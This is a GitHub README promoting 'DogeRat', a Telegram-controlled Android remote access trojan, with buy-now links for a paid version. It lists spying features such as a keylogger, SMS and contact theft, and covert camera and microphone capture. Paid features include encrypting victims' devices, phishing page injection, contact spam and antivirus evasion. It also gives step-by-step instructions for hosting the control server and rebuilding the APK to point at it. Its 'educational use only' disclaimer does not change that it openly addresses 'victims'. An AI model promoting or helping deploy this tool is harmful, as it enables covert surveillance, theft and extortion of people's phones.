<p align="center">
  <img src="images/logo.PNG" alt="logo" style="max-width: auto%; height: auto;" />

</p>
<p align="center">
  <i>A multifunctional Telegram based Android RAT without port forwarding</i>
</p>



<h2 align="center">Panel Screenshot</h2>
<p align="center">
  <img src="images/4.jpg" alt="Screenshot 1" style="max-width: 100%; height: auto;" />

</p>


## Features
- 🔴 Real time
- 🌐 custom web view
- 🔔 notification reader
- 🔔 notification sender (send custom notification that apper on target device with custom click link)
- 🗨️ show toast message on target device (Toasts are messages that appear in a box at the bottom of the device)
- 📡 receive information about simcard provider
- 📳 vibrate target device
- 🛰️ receive device location
- ✉️ receive all target message
- ✉️ send sms with target device to any number
- ✉️ send sms with target device to all of his/her contacts
- 👤 recive all target contacts
- 💻 receive list of all installedd apps in target device
- 📷 capture main and front camera
- 🎙 capture microphone (with custom duration)
- 📋 receive last clipboard text
- ✅️ auto start after device boot
- 🔐 Keylogger
- ✨ Beautiful telegram bot interface
  ## DOGE RAT PAID VERSION FEATURES
- 🤖 Auto permisson  
- 🔐Encrypt/ Decrypt after encryption victims will be not able to use their devices
- 🖥️ Screenshot (get screenshot from your victim device)
- 🗨️ spam message in all contacts after installation which you will set in apk
- 🔐injection {inject appliactaion automatic with any login or any page unlimited }
- 🔐 Open any phising page in victim device
- 🖥️ Screenshot (get screenshot from your victim device)
- 📒 Gallery puller (Get all photos available in gallery)
- 🔔 notification reader
- 🔔 notification sender (send custom notification that apper on target device with custom click link)
- 🗨️ show toast message on target device (Toasts are messages that appear in a box at the bottom of the device)
- 🔤 Advance Keylogger
- 📁 receive any file or folder from target device
- 📁 delete any file or folder from target device
- 📁 PowerFull file manager
- ✨ Beautiful telegram bot interface
- 🤖 Undetectable by antivirus
- 🤖and more ......
  <p align="center">
  <a href="https://t.me/+PWHdkfykma1lMTE1">
    <img src="https://img.shields.io/badge/BUY-NOW-blue?style=for-the-badge&logo=telegram" alt="Telegram Badge"/>
  </a>
  <a href="https://t.me/+PWHdkfykma1lMTE1">
    <img src="https://img.shields.io/badge/BUY-NOW-blue?style=for-the-badge&logo=telegram" alt="Telegram Badge"/>
  </a>
  <a href="https://t.me/+PWHdkfykma1lMTE1">
    <img src="https://img.shields.io/badge/BUY-NOW-blue?style=for-the-badge&logo=telegram" alt="Telegram Badge"/>
  </a>
  </p>
<h2>Requirements</h2>
<ul>
  <li><span style="color: #0074D9;">APK EDITOR</span></li>
  <li><span style="color: #2ECC40;">ANY VPS</span></li>
  <li>For hosting server code, you can use some free services like:</li>
  <ul>
  <li><a href="https://render.com/" style="color: #B10DC9;">render.com {reccomended}</a></li>
    <li><a href="https://replit.com/" style="color: #FF4136;">replit.com</a></li>
    <li><a href="https://glitch.com/" style="color: #FFDC00;">glitch.com</a></li>
    <li><a href="https://heroku.com/" style="color: #B10DC9;">heroku.com</a></li>
  </ul>
  <p align="center">
  <a href="https://t.me/+PWHdkfykma1lMTE1">
    <img src="https://img.shields.io/badge/📹%20VIDEO%20TUTORIALS%20AVAILABLE%20HERE-blue?style=for-the-badge" alt="Video Tutorials Available Here" />
  </a>
</p>
  <li>Keep in mind that these sites can suspend your projects, so it's better to host on your own computer.</li>
  
</ul>

<h2 align="center">Download</h2>

<p align="center">
  <a href="/TOOLS/APKEditor.apk">
    <img src="https://img.shields.io/badge/Termux%20Download-Click%20to%20Download-brightgreen?style=for-the-badge&logo=android" alt="Download APK EDITOR" />
  </a>
  <a href="TOOLS/APK Easy Tool v157-1 Setup (Fix).msi">
    <img src="https://img.shields.io/badge/APK%20Editor%20Download-Click%20to%20Download-brightgreen?style=for-the-badge&logo=android" alt="Download APK EASY TOOL" />
  </a>
</p>


## How to host server in RENDER.COM
<p>FOLLOW THWSW STEPS:</p>



```bash  
 - DOWNLOAD THE FILES FROM HERE
 - CREATE A GITHUB ACCOUNT 
 - CREATE A PRIVATE NEW REPO AND UPLOAD ALL FILES {SERVER.JS/PACKAGE.JSON/DATA.JSON }
 - NOW GO TO RENDER.COM
  SIGNUP WITH GITHUB/CONFIRM ACCOUNT/CONNECT GITHUB ACCOUNT
 - NOW CLICK ON NEW WEB SERVICE/SELECT FREE  TRIAL/GIVE ANY RANDOM NAME OF YOUR WEB SERVICE
- NOW YOU WILL SEE HERE YOUR REPO WHICH YOU CREATED 
- CLCIK ON THAT IT WILL START DEPLOYING IGNORE IT AND COPY THE URL OF YOUR WEB SERVICE
- NOW COMEBACK TO YOUR GITHUB REPO AND EDIT DATA.JSON
- ENTER YOUR BOT TOKEN,CHAT ID URL WHICH YOU COPIED FROM RENDER.COM
- SAVE DATA.JSON
- GO BACK TO RENDER.COM AND OPEN YOUR PROJECT AND CLICK ON DEPLOY/THEN DEPLOY LATEST COMMITS
- IT WILL TAKE FEW SECONDS ONCE YOU WILL SEE IN TERMINAL THAT YOUR SERVICE IS LIVE
- NOW GO TO TELEGRAM BOT AND START THE BOT ENJOYYYYYY
```

## Edit apk
 - Open Apk editor 
 - select apk
 - choose full edit
 - select decode all files
 - go to assets folder
 - open host.json
 - and enter url
 - build apk ,start the bot  Enjoy

## example
```bash  
  https://yourRENDERURL.com/

```




<h2 align="center">🔗 Contact and Social Media Accounts</h2>

<p align="center">
  <a href="https://t.me/+PWHdkfykma1lMTE1">
    <img src="https://img.shields.io/badge/CONTACT-TELEGRAM-blue?style=for-the-badge&logo=telegram" alt="Telegram Badge"/>
  </a>
  <a href=https://t.me/+PWHdkfykma1lMTE1>
    <img src="https://img.shields.io/badge/CONTACT-INSTAGRAM-red?style=for-the-badge&logo=instagram" alt="Instagram Badge"/>
  </a>
  <a href="https://t.me/+PWHdkfykma1lMTE1>
    <img src="https://img.shields.io/badge/CONTACT-TWITTER-blue?style=for-the-badge&logo=twitter" alt="Twitter Badge"/>
  </a>
  <a href=https://t.me/+PWHdkfykma1lMTE1>
    <img src="https://img.shields.io/badge/CONTACT-YOUTUBE-red?style=for-the-badge&logo=youtube" alt="Youtube Badge"/>
  </a>
</p>


<p align="center">
  <img src="https://img.shields.io/badge/Disclaimer-Important-red" alt="Important Disclaimer"/>
</p>

<p align="center">
  <b><i>Note:</i></b> The developer provides no warranty with this software and will not be responsible for any direct or indirect damage caused by the usage of this tool. Dogerat is built for educational and internal use only.
</p>

<p align="center">
  <b><i>Attention:</i></b> We do not endorse any illegal or unethical use of this tool. The user assumes all responsibility for the use of this software.
</p>

<p align="center">
  <b><i>Important:</i></b> To prevent any fraudulent activity, please ensure that the Instagram username is <a href="https://t.me.com/CyberShieldX"><code>@CYBERSHIELDX</code></a> and the Telegram handle is <a href="https://t.me/CyberShieldX"><code>@CYBERSHIELDX</code></a>. Beware of scams and phishing attempts that use similar usernames or handles.
</p>

<p align="center">
  <b><i>Thank you for using Dogerat - we hope it serves its intended purpose and helps you achieve your goals!</i></b>
</p>





<p align="center">
<h1 align="center">Sponsorship</h1>

<p align="center">If you find my work valuable, you can show your support by sponsoring me. 
  Your contribution will help me maintain and improve my projects, and it will encourage me to create more useful content.</p>

<p align="center">
  <a href="https://www.buymeacoffee.com/shivayadav"><img src="https://img.shields.io/badge/-Buy%20me%20a%20coffee-orange?style=for-the-badge&logo=buy-me-a-coffee&logoColor=white" alt="Buy me a coffee"></a>
</p>





<p align="center">Thank you to the following people for their support:</p>

<div align="center">
  <a href="https://github.com/shivaya-dav/DogeRat/stargazers">
    <img src="https://reporoster.com/stars/dark/shivaya-dav/DogeRat" alt="Stargazers" title="Stargazers" width="400" height="auto">
  </a>
  
  -------------------------
  <a href="https://github.com/shivaya-dav/DogeRat/network/members">
    <img src="https://reporoster.com/forks/dark/shivaya-dav/DogeRat" alt="Forkers" title="Forkers" width="400" height="auto">
  </a>
</div>
